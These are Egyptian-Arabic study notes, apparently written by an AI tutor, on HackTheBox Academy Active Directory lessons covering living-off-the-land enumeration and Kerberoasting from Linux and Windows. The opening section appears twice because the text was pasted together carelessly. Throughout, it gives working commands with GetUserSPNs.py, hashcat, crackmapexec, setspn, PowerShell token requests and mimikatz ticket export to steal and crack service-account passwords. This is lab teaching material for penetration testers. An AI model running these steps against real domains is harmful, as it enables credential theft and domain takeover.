dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

طلع:

```text
ACADEMY-EA-DC01$
```

---

## الـOID نفسه

عندك 3 مهمين في الـmodule:

```text
1.2.840.113556.1.4.803
```

Exact bit match.

```text
1.2.840.113556.1.4.804
```

Any matching bit.

```text
1.2.840.113556.1.4.1941
```

بيستخدم مع Distinguished Name والـmembership/ownership relationships.

---

## 14. Logical Operators

تقدر تعمل filters مركبة.

### AND

```text
&
```

مثلاً:

```text
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

يعني:

```text
Object لازم يكون User
        AND
UAC bit معين لازم يكون موجود
```

### NOT

```text
!
```

### OR

```text
|
```

وده بيخليك تعمل LDAP queries دقيقة بدل ما تجيب كل حاجة وتفلترها يدويًا.

---

## الخلاصة اللي عايزك تخرج بيها

الـLiving Off The Land workflow في اللاب تقريبًا:

```text
Initial Foothold
      │
      ▼
hostname / systeminfo
      │
      ▼
whoami / USERDOMAIN / logonserver
      │
      ▼
ipconfig / arp / route
      │
      ▼
qwinsta
      │
      ▼
PowerShell / WMI
      │
      ▼
net commands
      │
      ▼
dsquery
      │
      ▼
LDAP Filters
      │
      ▼
فهم الـDomain والـHosts والـUsers والـGroups
```

والـmindset هنا أهم من الأدوات:

**لو مفيش SharpHound، PowerView، Snaffler، أو Internet → لسه عندك Windows نفسه كـenumeration toolkit.**

وده بالضبط سبب إن الجزء ده جه بعد Credentialed Enumeration وقبل **Kerberoasting**.تمام، الملف الجديد هو جزء **Living Off the Land** من HTB، وده بيكمل مباشرة بعد Credentialed Enumeration.

الفكرة الأساسية هنا:

> بدل ما تنزل SharpHound / PowerView / Snaffler على الجهاز، تستخدم الأدوات الموجودة أصلًا في Windows وAD.

وده مهم جدًا في الـPentest لأن البيئة ممكن تكون **managed host + مفيش Internet + ممنوع/فشل تحميل tools**، وكمان تحميل أدوات خارجية ممكن يرفع احتمالية اكتشافك.

## أهم حاجة بالنسبة لسؤالك السابق عن SharpHound

الـ`SharpHound.exe` اللي حاولت تشغله **مش جزء من Living Off The Land**.

يعني لو أنت داخل اللاب وعايز تكمل الجزء الجديد، مش المفروض أصلًا تعتمد على:

```powershell
.\SharpHound.exe -c All
```

الجزء ده هيبدأ معاك بأدوات Windows الأصلية.

---

## 1. أول حاجة: اعرف أنت على إيه

### `hostname`

```powershell
hostname
```

بيجيب اسم الجهاز.

مثلاً:

```text
ACADEMY-EA-MS01
```

---

### إصدار Windows

```powershell
[System.Environment]::OSVersion.Version
```

يعني تعرف الـOS version والـrevision.

---

### الـPatches

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

ده يوريك الـhotfixes والـpatches المثبتة.

مفيد جدًا لأنك بتعرف:

- الجهاز محدث ولا لأ
    
- فيه patches ناقصة؟
    
- هل فيه software/version قديم؟
    

---

## 2. اعرف الـNetwork بتاع الجهاز

### `ipconfig /all`

```cmd
ipconfig /all
```

منه تعرف:

- IP
    
- DNS
    
- Gateway
    
- Network adapter
    
- DHCP
    
- Domain-related configuration
    

---

### اعرف الـDomain

من CMD:

```cmd
echo %USERDOMAIN%
```

مثلاً:

```text
INLANEFREIGHT
```

وده اسم الـdomain اللي الجهاز تابع ليه.

---

### اعرف الـDomain Controller

```cmd
echo %logonserver%
```

مثلاً:

```text
\\ACADEMY-EA-DC01
```

يعني الجهاز بيتعامل مع الـDC ده.

---

## 3. بدل كل ده ممكن تستخدم `systeminfo`

```cmd
systeminfo
```

دي بتجمعلك معلومات كتير عن الجهاز في output واحد.

HTB بيذكر إن استخدام command واحد ممكن ينتج logs أقل من تشغيل commands كتير منفصلة، لكن طبعًا ده **مش معناه إنه غير مراقب**.

---

## 4. PowerShell مهم جدًا

شوف الـmodules الموجودة:

```powershell
Get-Module
```

مثلاً ممكن تلاقي:

```text
ActiveDirectory
Microsoft.PowerShell.Utility
PSReadline
```

`Get-Module` هنا بيساعدك تعرف إيه المتاح على الجهاز بالفعل.

وده مرتبط جدًا بالخطأ اللي ظهرلك قبل كده.

أنت كنت بتحاول تشغل:

```powershell
.\SharpHound.exe
```

وده external executable.

لكن Living Off The Land بيقول:

**شوف الأول إيه الموجود أصلًا على الجهاز واستخدمه.**

---

## 5. Environment Variables

```powershell
Get-ChildItem Env: | ft Key,Value
```

دي بتعرض environment variables.

ممكن تلاقي حاجات زي:

```text
COMPUTERNAME
USERDOMAIN
USERNAME
USERPROFILE
PATH
PSModulePath
```

مثلاً:

```text
COMPUTERNAME = ACADEMY-EA-MS01
USERDOMAIN   = INLANEFREIGHT
USERNAME     = ACADEMY-EA-MS01$
```

### ليه ده مهم؟

لأنك بتبني صورة سريعة:

```text
مين أنا؟
        ↓
أنا على أنهي جهاز؟
        ↓
الجهاز تابع لأنهي Domain؟
        ↓
إيه الـPATH والـModules المتاحة؟
```

---

## 6. `qwinsta` — هل أنا لوحدي؟

دي مهمة جدًا.

```cmd
qwinsta
```

ممكن تشوف:

```text
SESSIONNAME    USERNAME    ID    STATE
console        forend      1     Active
```

معناها إن فيه user اسمه `forend` عامل interactive session على الجهاز.

ليه يهمك؟

لأنك لو بتعمل assessment من جهاز شخص تاني، وجوده على نفس الجهاز ممكن يكون operational concern.

---

## 7. `arp -a`

```cmd
arp -a
```

دي بتعرض الأجهزة اللي الجهاز الحالي عنده ARP entries ليها.

مثلاً:

```text
172.16.5.5
172.16.5.130
172.16.5.240
```

مش معناها إن دي كل الأجهزة الموجودة في الشبكة.

لكن معناها:

> الأجهزة دي ظهرت للـhost الحالي على Layer 2/ARP.

وده ممكن يساعدك تكتشف network neighbors.

---

## 8. `route print`

```cmd
route print
```

دي من أهم الحاجات.

بتقولك:

**الجهاز ده عارف يوصل لأنهي networks؟**

مثلاً في اللاب:

```text
10.129.0.0/16
172.16.4.0/23
```

لو لقيت network مش موجودة في الـnetwork segment اللي أنت فاكره، دي تستحق investigation.

HTB بيشير إن routing information ممكن تكشف network segments إضافية وقد تكون مهمة في الـpivoting.

---

## 9. WMI

WMI = **Windows Management Instrumentation**

فكر فيه كـframework بيسمحلك تستعلم عن Windows والـdomain information.

مثلاً:

```cmd
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```

أو:

```cmd
wmic process list /format:list
```

أو:

```cmd
wmic useraccount list /format:list
```

أو:

```cmd
wmic group list /format:list
```

أو:

```cmd
wmic ntdomain list /format:list
```

الـ`wmic ntdomain` بالذات ممكن يوريك معلومات عن الـdomain والـDCs.

---

## 10. Net Commands

دي من أهم أجزاء الـmodule.

مثلاً:

### كل Domain Users

```cmd
net user /domain
```

### معلومات User معين

```cmd
net user wrouse /domain
```

### كل Domain Groups

```cmd
net group /domain
```

### أعضاء Domain Admins

```cmd
net group "Domain Admins" /domain
```

### أجهزة الـDomain

```cmd
net group "domain computers" /domain
```

### Domain Controllers

```cmd
net group "Domain Controllers" /domain
```

### Password Policy

```cmd
net accounts /domain
```

### Shares

```cmd
net view /all /domain
```

الـmodule بيجمع مجموعة كبيرة من الـ`net` commands للـusers/groups/computers/DCs/password policy/shares.

---

## 11. نقطة مهمة جدًا: `net1`

الـmodule بيشرح إن:

```cmd
net1
```

بينفذ نفس وظائف `net`، وبيُذكر كطريقة لتجنب بعض الـdetections المبنية بشكل ساذج على string `net`.

لكن خلي بالك:

**ده مش bypass سحري للـEDR.**

لو الـEDR بيراقب process behavior أو command execution بشكل كويس، تغيير `net` إلى `net1` مش هيخليك invisible.

---

## 12. Dsquery

وده من أهم الأدوات في الجزء ده.

```cmd
dsquery user
```

يجيب الـAD users.

مثلاً:

```text
CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
...
```

والـcomputer:

```cmd
dsquery computer
```

يجيب أجهزة الـDomain.

---

## 13. LDAP Filters

هنا الجزء اللي لازم تفهمه كويس، مش تحفظه.

مثلاً:

```text
userAccountControl:1.2.840.113556.1.4.803:=8192
```

معناه إنك بتعمل LDAP matching على `userAccountControl` باستخدام bitmask.

الـ`8192` في المثال بتستخدم للبحث عن Domain Controllers.

يعني:

```cmd
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

طلع:

```text
ACADEMY-EA-DC01$
```

---

## الـOID نفسه

عندك 3 مهمين في الـmodule:

```text
1.2.840.113556.1.4.803
```

Exact bit match.

```text
1.2.840.113556.1.4.804
```

Any matching bit.

```text
1.2.840.113556.1.4.1941
```

بيستخدم مع Distinguished Name والـmembership/ownership relationships.

---

## 14. Logical Operators

تقدر تعمل filters مركبة.

### AND

```text
&
```

مثلاً:

```text
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

يعني:

```text
Object لازم يكون User
        AND
UAC bit معين لازم يكون موجود
```

### NOT

```text
!
```

### OR

```text
|
```

وده بيخليك تعمل LDAP queries دقيقة بدل ما تجيب كل حاجة وتفلترها يدويًا.

---

## الخلاصة اللي عايزك تخرج بيها

الـLiving Off The Land workflow في اللاب تقريبًا:

```text
Initial Foothold
      │
      ▼
hostname / systeminfo
      │
      ▼
whoami / USERDOMAIN / logonserver
      │
      ▼
ipconfig / arp / route
      │
      ▼
qwinsta
      │
      ▼
PowerShell / WMI
      │
      ▼
net commands
      │
      ▼
dsquery
      │
      ▼
LDAP Filters
      │
      ▼
فهم الـDomain والـHosts والـUsers والـGroups
```

والـmindset هنا أهم من الأدوات:

**لو مفيش SharpHound، PowerView، Snaffler، أو Internet → لسه عندك Windows نفسه كـenumeration toolkit.**

وده بالضبط سبب إن الجزء ده جه بعد Credentialed Enumeration وقبل **Kerberoasting**.


# Layer 17
## Kerberoasting من Linux — شرح بالمصري

الفكرة كلها في الأول:

**إحنا عندنا Domain User عادي → ندور على Service Accounts عليها SPN → نطلب TGS Ticket ليها → ناخد الـ Ticket ونكسره Offline → لو الباسورد اتكسر، نستخدم الـ credentials بتاعتها حسب صلاحيات الحساب.**

خلينا نفك كل جزء.

---

## 1. يعني إيه SPN؟

**SPN = Service Principal Name**

ده اسم بيستخدمه **Kerberos** عشان يعرف:

> الخدمة دي شغالة تحت أنهي Account؟

مثلاً:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

معناه تقريبًا:

```text
MSSQLSvc       → نوع الخدمة SQL Server
DEV-PRE-SQL    → السيرفر
1433           → Port
```

والـ SPN ده ممكن يكون مربوط بـ User اسمه:

```text
sqldev
```

يعني:

```text
sqldev
   ↓
MSSQL Service
   ↓
DEV-PRE-SQL:1433
```

---

## 2. ليه Service Account بيكون User أصلاً؟

ممكن تقول:

> ليه SQL Server مثلاً محتاج User Account؟

لأن الخدمات في Windows ممكن تشتغل تحت حساب معين.

مثلاً:

```text
SQL Server
    ↓
sqldev
```

فالـ SQL Server بياخد صلاحيات `sqldev`.

المشكلة إن الـ admins أحيانًا بيدوا Service Accounts صلاحيات كبيرة جدًا.

مثلاً:

```text
sqldev
   ↓
Domain Admins
```

وده طبعًا خطر جدًا.

---

## 3. فين ثغرة Kerberoasting؟

أهم نقطة في الموضوع:

**أي Domain User authenticated يقدر يطلب TGS لأي Service Account عنده SPN.**

يعني لو إحنا معانا:

```text
forend
```

وهو User عادي في الدومين، نقدر نقول للـ Domain Controller:

> اديني TGS للخدمة اللي شغالة تحت `sqldev`.

والـ DC هيطلعهولنا.

وده مش معناه إننا بقينا `sqldev`.

دي نقطة مهمة جدًا.

---

## 4. طب الـ TGS فيه إيه؟

الـ TGS = **Ticket Granting Service ticket**

الـ Ticket نفسه متشفّر باستخدام secret مرتبط بحساب الخدمة، وهنا تحديدًا الـ **NTLM hash بتاع Service Account** في حالة RC4/etype 23.

بالتالي عندنا حاجة بالشكل ده:

```text
TGS
 ↓
Encrypted باستخدام secret بتاع sqldev
```

إحنا مش بنفك تشفير الـ TGS مباشرة.

لكن نقدر نعمل:

```text
TGS
 ↓
Offline password cracking
 ↓
Password
```

وده هو **Kerberoasting**.

---

## 5. ليه Offline؟

دي من أهم مميزات الهجوم.

إحنا بعد ما ناخد الـ TGS:

```text
DC
 ↓
TGS
 ↓
جهازنا
```

مش محتاجين نفضل نطلب Password guesses من الـ DC.

بدل كده:

```text
TGS
 ↓
Hashcat
 ↓
password guesses محليًا
```

يعني الـ Domain Controller مش شايف ملايين محاولات الباسورد.

وده بيخلي الهجوم أخطر.

---

## 6. إيه المطلوب عشان أعمل Kerberoasting؟

واحد من دول:

### الحالة الأشهر

Credentials بتاعت Domain User:

```text
domain/user:password
```

### أو

NTLM hash بتاع Domain User.

### أو

Shell شغال بالفعل كـ Domain User.

### أو

SYSTEM على جهاز Domain-Joined.

وكمان محتاج تعرف الـ **Domain Controller**.

مثلاً:

```text
DC = 172.16.5.5
Domain = INLANEFREIGHT.LOCAL
```

---

## 7. ليه Service Accounts خطيرة؟

لأنها أحيانًا بتكون واخدة صلاحيات زيادة.

مثلاً:

```text
sqldev
 ├── SPN
 ├── SQL Server service
 └── Domain Admins
```

لو قدرنا نكسر Password بتاع `sqldev`:

```text
sqldev
   ↓
database!
   ↓
Domain Admin
   ↓
Domain Compromise
```

وده سبب إننا بنبص على **MemberOf** لما نعمل enumeration.

---

## 8. هل مجرد وجود SPN معناه إننا اتخترقنا؟

**لا.**

دي نقطة الكتاب مركز عليها.

وجود:

```text
SPN
```

مش معناه:

```text
Domain Admin
```

إحنا لسه محتاجين:

```text
SPN
 ↓
TGS
 ↓
Crack
 ↓
Password
 ↓
Check privileges
```

وممكن الباسورد **مايتكسرش أصلاً**.

---

## 9. تثبيت Impacket

الكتاب بيستخدم:

```text
Impacket
```

وهي مجموعة أدوات Python مشهورة جدًا في Active Directory pentesting.

بعد تثبيتها، هتلاقي أدوات زي:

```text
GetUserSPNs.py
```

والأداة دي تحديدًا هي اللي هنستخدمها في Kerberoasting.

---

## 10. GetUserSPNs.py بتعمل إيه؟

اسمها واضح:

```text
GetUserSPNs.py
```

بتسأل الـ Domain:

> إيه الـ Users اللي عندهم SPNs؟

يعني بدل ما إحنا نعرف الحسابات يدويًا، الأداة تعمل enumeration.

---

## 11. الأمر الأول

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

نفككه:

### `GetUserSPNs.py`

الأداة.

### `-dc-ip 172.16.5.5`

قول للأداة:

> الـ Domain Controller موجود على الـ IP ده.

### `INLANEFREIGHT.LOCAL/forend`

يعني:

```text
Domain = INLANEFREIGHT.LOCAL
User   = forend
```

بعدها هتطلب:

```text
Password:
```

---

## 12. النتيجة

هتطلع حاجة زي:

```text
ServicePrincipalName
Name
MemberOf
PasswordLastSet
LastLogon
Delegation
```

أهم 3 بالنسبة لنا:

### ServicePrincipalName

الخدمة:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

### Name

الحساب:

```text
sqldev
```

### MemberOf

صلاحيات الحساب:

```text
Domain Admins
```

وده أهم جزء.

لأننا لو لقينا:

```text
sqldev → Domain Admins
```

فده Target مهم جدًا.

---

## 13. مثال الـ output

عندنا:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
sqldev
Domain Admins
```

معناه:

```text
SQL Service
     ↓
شغالة بحساب sqldev
     ↓
sqldev عضو في Domain Admins
```

فلو قدرنا نطلع Password بتاع `sqldev`:

```text
Domain Admin credentials
```

---

## 14. طلب الـ TGS

بدل ما نعمل enumeration بس، نضيف:

```bash
-request
```

فيبقى:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

الفرق:

بدون `-request`:

```text
هاتلي SPNs
```

مع `-request`:

```text
هاتلي SPNs
+
اطلب TGS لكل Service Account
```

---

## 15. ليه الـ output طويل جدًا؟

لأن الـ TGS نفسه بيطلع في صيغة زي:

```text
$krb5tgs$23$*sqldev$...
```

ده مش Password.

ده **Kerberos TGS hash/cracking representation**.

بنحطه في أداة cracking.

---

## 16. ليه `$krb5tgs$23$`؟

الجزء ده بيوصف نوع الـ Kerberos ticket/hash format.

```text
krb5tgs
```

يعني Kerberos TGS.

```text
23
```

يعني **RC4-HMAC / etype 23**.

وده النوع اللي Hashcat بيستخدم له:

```text
-m 13100
```

---

## 17. ممكن أطلب Ticket لحساب واحد بس؟

آه.

بدل:

```bash
-request
```

نستخدم:

```bash
-request-user sqldev
```

مثلاً:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

ده معناه:

> أنا مهتم بـ `sqldev` بس، اديني الـ TGS بتاعه.

وده مفيد لما تكون عملت enumeration ولقيت Account مهم.

---

## 18. ليه نعمل Account واحد بدل كل الحسابات؟

عشان ممكن تكون لقيت:

```text
backupagent → Domain Admins
solarwinds → Domain Admins
sqldev → Domain Admins
```

ومحتاج تختبر واحد معين.

بدل ما تطلع Tickets لكل حاجة:

```text
-request-user sqldev
```

---

## 19. نحفظ الـ Ticket في File

ممكن نستخدم:

```bash
-outputfile sqldev_tgs
```

مثلاً:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
-request-user sqldev \
-outputfile sqldev_tgs
```

دلوقتي:

```text
sqldev_tgs
```

فيه الـ TGS.

ليه نحفظه؟

عشان نديه لـ Hashcat.

---

## 20. دلوقتي جه دور Hashcat

الأمر:

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

نفككه:

### `hashcat`

أداة password cracking.

### `-m 13100`

Hashcat mode الخاص بـ:

```text
Kerberos 5 TGS-REP
etype 23
```

### `sqldev_tgs`

الـ Ticket اللي إحنا طلعناه.

### `rockyou.txt`

Wordlist فيها كلمات مرور شائعة.

---

## 21. Hashcat بيعمل إيه هنا؟

ببساطة:

عنده:

```text
TGS
```

وعنده candidates:

```text
password123
database!
admin123
...
```

يجرب كل Password ويشوف:

> هل الـ Password دي تقدر تنتج الـ secret اللي يتوافق مع الـ TGS؟

لو آه:

```text
CRACKED
```

---

## 22. وفي المثال الباسورد اتكسر

النتيجة كانت:

```text
database!
```

يعني:

```text
sqldev : database!
```

إحنا كده انتقلنا من:

```text
TGS
```

إلى:

```text
Cleartext password
```

وده الهدف الأساسي من Kerberoasting.

---

## 23. هل كده بقينا Domain Admin؟

لسه لازم **نتأكد**.

إحنا عرفنا من الـ enumeration إن:

```text
sqldev → Domain Admins
```

فالمفروض credentials دي تدي صلاحيات Domain Admin.

لكن في الـ pentest بنعمل validation.

مثلاً:

```bash
crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

والنتيجة:

```text
[+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

معناها إن الـ credentials اشتغلت على الـ DC، والـ account عنده صلاحيات قوية جدًا.

---

## 24. الصورة كلها في Flow واحد

احفظها بالشكل ده:

```text
Domain User
     │
     ▼
Enumerate SPNs
     │
     ▼
Find Service Account
     │
     ▼
Request TGS
     │
     ▼
Save TGS
     │
     ▼
Hashcat / Offline Cracking
     │
     ▼
Password
     │
     ▼
Check Account Privileges
     │
     ▼
Lateral Movement / Privilege Escalation
```

ولو الحساب:

```text
Service Account
       +
SPN
       +
Weak Password
       +
High Privileges
```

يبقى Kerberoasting ممكن يبقى خطير جدًا.

---

## 25. طب لو الباسورد قوي؟

ساعتها ممكن يحصل:

```text
SPN found
   ↓
TGS obtained
   ↓
Hashcat
   ↓
Nothing
```

وده طبيعي.

**Kerberoasting مش معناه إنك هتكسر الباسورد.**

الهجوم بيعتمد جدًا على قوة Password بتاعة Service Account.

---

## 26. ليه Service Accounts بالذات معرضة؟

لأن الـ admins ممكن يعملوا حاجات زي:

```text
Password طويل؟ لا
Password عشوائي؟ لا
Password rotation؟ نادر
Password reused؟ ممكن
```

وأحيانًا بشكل سيئ جدًا:

```text
username = sqldev
password = sqldev
```

أو Password سهلة التخمين.

وده بيخلي الـ TGS قابل للكسر Offline.

---

## 27. طب لو الحساب اللي اتكسر Low Privilege؟

برضه مش بالضرورة بلا قيمة.

مثلاً:

```text
sqldev
```

مش Domain Admin.

لكن عنده SQL Server privileges قوية.

أو ممكن يكون Local Admin على Servers كتير.

فممكن نستخدم credentials في:

```text
Lateral Movement
```

وبالتالي:

```text
Server A
   ↓
Server B
   ↓
Domain escalation
```

---

## 28. مثال SQL اللي الكتاب ذكره

لو الـ SPN:

```text
MSSQL/SRV01
```

والـ account عنده صلاحيات SQL عالية، ممكن credentials تسمح لنا بالدخول على SQL Server بصلاحيات قوية.

وفي سيناريوهات معينة، لو عندنا `sysadmin` على SQL Server، ممكن إساءة استخدام:

```text
xp_cmdshell
```

لتنفيذ أوامر على الجهاز.

فمش لازم الحساب نفسه يكون Domain Admin عشان يكون مفيد.

---

## 29. هل Kerberoasting شغال من Linux بس؟

لا.

ممكن من:

```text
Linux غير Domain-Joined
```

باستخدام credentials.

أو:

```text
Linux Domain-Joined
```

بـ keytab.

أو:

```text
Windows Domain-Joined
```

وأنت authenticated كـ Domain User.

أو باستخدام أدوات Windows زي:

```text
Rubeus
PowerView
Mimikatz
setspn.exe
```

الفكرة واحدة، الأدوات هي اللي بتختلف.

---

## 30. نقطة مهمة جدًا: Kerberoasting ≠ AS-REP Roasting

الاتنين بيتلخبطوا.

### Kerberoasting

بنستهدف:

```text
Service Accounts
+
SPN
```

وبنطلب:

```text
TGS
```

### AS-REP Roasting

بنستهدف Users عندهم:

```text
Do not require Kerberos preauthentication
```

والـ material اللي بناخده مختلف.

فافتكر:

```text
SPN → Kerberoasting → TGS
```

---

## 31. ليه الكتاب بيقول Lateral Movement / Privilege Escalation؟

لأن النتيجة ممكن تختلف.

لو الحساب:

```text
User A
   ↓
Kerberoast
   ↓
Service Account
   ↓
Local Admin on Server B
```

ده **Lateral Movement**.

أما:

```text
User A
   ↓
Kerberoast
   ↓
Domain Admin
```

ده **Privilege Escalation / Domain Compromise**.

---

## 32. آخر جزء: تقييم الخطورة

الكتاب بيقول حاجة مهمة جدًا في الـ Pentest Report.

مش كل Kerberoasting finding نفس الخطورة.

### الحالة الأولى

كسرنا Ticket وطلع:

```text
Domain Admin
```

ده تأثيره كبير جدًا.

### الحالة الثانية

كسرنا Account مهم وده ساعدنا نوصل للـ Domain.

برضه تأثيره كبير.

### الحالة الثالثة

طلعنا Tickets لكن:

```text
ولا Ticket اتكسر
```

هنا الـ risk أقل من الحالات السابقة، لأننا أثبتنا وجود الـ weakness لكن **ماقدرناش نثبت compromise فعلي للحسابات**.

وده فرق مهم في الـ Reporting:

> **وجود attack path ≠ إثبات impact بنفس الدرجة.**

---

## الخلاصة اللي تحفظها

لو في HTB سألك: **Kerberoasting بيشتغل إزاي؟**

جاوب في دماغك:

```text
1. عندي Domain User
2. أعمل Enumeration للـ SPNs
3. ألاقي Service Account
4. أشوف صلاحيات الحساب
5. أطلب TGS
6. آخد الـ TGS hash
7. أعمل Offline Cracking
8. لو Password اتكسرت:
      أستخدم credentials
9. أتحقق من صلاحيات الحساب
10. أشوف هل وصلت لـ Local Admin / SQL Admin / Domain Admin
```

وأهم 4 حاجات في الدرس:

```text
SPN
 ↓
TGS
 ↓
Offline Cracking
 ↓
Service Account Credentials
```

**ودي بالظبط الفكرة اللي محتاج تكون فاهمها قبل ما تدخل الجزء بتاع Kerberoasting من Windows.**


# Layer 18
تمام. الجزء ده بيكمل **Kerberoasting من Windows**، والـ main idea فيه إننا بنعمل نفس الهجوم اللي شرحناه من Linux، لكن بدل `GetUserSPNs.py` بنستخدم أدوات Windows، بدايةً من الطريقة اليدوية لحد `PowerView` و`Rubeus`.

## 1. الـ Semi-Manual Method

الفكرة العامة:

```text
Enumerate SPNs
      ↓
اختار Service Account
      ↓
Request TGS
      ↓
TGS يتحط في Memory
      ↓
Mimikatz يستخرج الـ Ticket
      ↓
.kirbi
      ↓
Convert to Hashcat format
      ↓
Hashcat
      ↓
Password
```

يعني نفس Kerberoasting، بس Windows-native.

---

## 2. أول خطوة: Enumerate الـ SPNs بـ `setspn`

```cmd
setspn.exe -Q */*
```

`setspn`
أداة Windows built-in للتعامل مع الـ SPNs.

### يعني إيه `-Q */*`؟

معناها تقريبًا:

> Query عن كل الـ SPNs الموجودة.

فتطلع حاجات زي:

```text
CN=sqlprod,...
    MSSQLSvc/SPSJDB.inlanefreight.local:1433

CN=sqldev,...
    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

المهم هنا إننا نربط:

```text
SPN
 ↓
Account
```

مثلاً:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
                ↓
              sqldev
```

وده معناه إن `sqldev` هو الـ account اللي الـ SQL service شغالة بيه.

### ليه بنركز على User Accounts؟

لأن الـ output ممكن يحتوي:

```text
Computer Accounts
User/Service Accounts
```

إحنا مهتمين بالـ service accounts، لأننا عايزين TGS يكون مشفّر بالـ secret الخاص بحساب service، وبعدها نحاول crack الـ TGS.

---

## 3. طلب TGS يدويًا بـ PowerShell

بعد ما لقينا:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

نقدر نطلب TGS له:

```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
-ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

خلينا نفهمها واحدة واحدة.

### `Add-Type`

```powershell
Add-Type -AssemblyName System.IdentityModel
```

بيحمّل .NET Assembly في PowerShell.

يعني بنقول لـ PowerShell:

> أنا محتاج الـ classes الموجودة في `System.IdentityModel`.

---

### `New-Object`

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
```

ده بيعمل object من الـ .NET class:

```text
KerberosRequestorSecurityToken
```

والـ class دي مسؤولة عن طلب Kerberos security token.

---

### الـ SPN

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

بنبعته للـ class، فيتم طلب:

```text
TGS
```

للـ service دي.

والـ output بيقول:

```text
ServicePrincipalName :
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

يعني الـ TGS اتطلب للـ SPN اللي إحنا حددناه.

---

## 4. طب الـ TGS راح فين؟

النقطة المهمة جدًا:

الـ TGS اتخزن في:

```text
Memory
```

مش ملف عندنا.

عشان كده بنستخدم:

```text
Mimikatz
```

عشان نستخرج الـ Kerberos tickets من الـ memory.

---

## 5. طلب Tickets لكل الـ SPNs

بدل ما نحدد SPN واحد:

```powershell
New-Object ...KerberosRequestorSecurityToken ...
```

المثال بيستخدم:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
```

عشان يجيب الـ SPNs.

وبعدين:

```powershell
Select-String '^CN'
```

و:

```powershell
% { New-Object ... }
```

بحيث كل SPN يتم استخدامه لطلب TGS.

يعني ببساطة:

```text
setspn
 ↓
جيب SPNs
 ↓
مرر كل SPN
 ↓
Request TGS
 ↓
Tickets في Memory
```

لكن المشكلة:

> هتجيب Computer Accounts كمان.

عشان كده الطريقة دي مش efficient قوي.

---

## 6. استخراج الـ Tickets بـ Mimikatz

الأمر:

```text
mimikatz # kerberos::list /export
```

معناه:

> List Kerberos tickets الموجودة في الـ memory وexportها.

هتلاقي مثلاً:

```text
Server Name :
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433

Client Name :
htb-student
```

وده مهم جدًا.

### Server Name

هو الـ service اللي طلبنا لها TGS:

```text
MSSQLSvc/DEV-PRE-SQL...
```

### Client Name

مين اللي طلب الـ ticket:

```text
htb-student
```

---

## 7. `rc4_hmac_nt`

في الـ output:

```text
0x00000017 - rc4_hmac_nt
```

الـ:

```text
0x17
```

يساوي:

```text
23 decimal
```

وده:

```text
RC4-HMAC
```

وده سبب إن Hashcat بعد كده يستخدم:

```text
-m 13100
```

لـ:

```text
Kerberos 5, etype 23, TGS-REP
```

---

## 8. إيه هو `.kirbi`؟

Mimikatz ممكن يطلع الـ ticket كملف:

```text
something.kirbi
```

الـ `.kirbi` ببساطة هو **ملف يحتوي Kerberos ticket**.

عندك طريقتين:

### الطريقة الأولى

Mimikatz يكتب `.kirbi` مباشرة:

```text
kerberos::list /export
```

### الطريقة الثانية

نستخدم:

```text
base64 /out:true
```

فيطلع الـ ticket كـ Base64.

وده اللي بيحصل في المثال.

---

## 9. ليه Base64؟

الـ Base64 هنا مجرد **طريقة لتمثيل الـ binary ticket كنص**.

يعني:

```text
Kerberos ticket binary
        ↓
      Base64
        ↓
    نص تقدر تنقله
```

لكن Hashcat مش هيشتغل على الـ Base64 مباشرة.

عشان كده بنرجعه تاني لـ `.kirbi`.

---

## 10. إزالة الـ Newlines

Mimikatz بيقسم الـ Base64 على كذا سطر.

لكن محتاجينه:

```text
single line
```

عشان كده:

```bash
echo "<base64 blob>" | tr -d \n
```

بتشيل الـ newline.

---

## 11. تحويل Base64 إلى `.kirbi`

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

يعني:

```text
Base64
 ↓ decode
Binary ticket
 ↓
sqldev.kirbi
```

---

## 12. `kirbi2john.py`

دلوقتي عندنا:

```text
sqldev.kirbi
```

لكن Hashcat مش عايز `.kirbi`.

فبنستخدم:

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

الأداة تستخرج الجزء المطلوب من الـ Kerberos ticket وتحوله لصيغة أقرب للـ cracking.

ويطلع:

```text
crack_file
```

---

## 13. تعديل الـ Hash Format

المثال يستخدم:

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

الفكرة مش إنك تحفظ الـ regex حرفيًا دلوقتي.

المهم تفهم إننا بنحوّل الناتج إلى format يفهمه Hashcat:

```text
$krb5tgs$23$...
```

